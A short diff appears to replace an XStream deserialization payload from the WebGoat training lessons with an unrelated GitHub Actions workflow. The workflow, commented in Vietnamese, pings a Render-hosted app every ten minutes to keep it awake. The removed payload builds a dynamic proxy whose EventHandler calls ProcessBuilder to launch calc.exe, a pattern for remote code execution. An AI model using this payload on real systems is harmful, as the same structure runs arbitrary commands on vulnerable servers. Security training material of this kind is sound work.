@@ -1,11 +1,19 @@
-<contact class='dynamic-proxy'>
-  <interface>org.owasp.webgoat.lessons.vulnerablecomponents.Contact</interface>
-  <handler class='java.beans.EventHandler'>
-    <target class='java.lang.ProcessBuilder'>
-      <command>
-        <string>calc.exe</string>
-      </command>
-    </target>
-    <action>start</action>
-  </handler>
-</contact>
+name: Keep Render App Alive
+
+on:
+  schedule:
+    # Chạy mỗi 10 phút
+    - cron: '*/10 * * * *'
+  workflow_dispatch: # Có thể trigger thủ công
+
+jobs:
+  ping:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Ping Render App
+        run: |
+          URL="https://wsproject-5eb9.onrender.com"
+          echo "Pinging $URL ..."
+          STATUS=$(curl -s -o /dev/null -w "%{http_code}" $URL || echo "000")
+          echo "HTTP Status: $STATUS"
+          # Không fail workflow dù curl lỗi
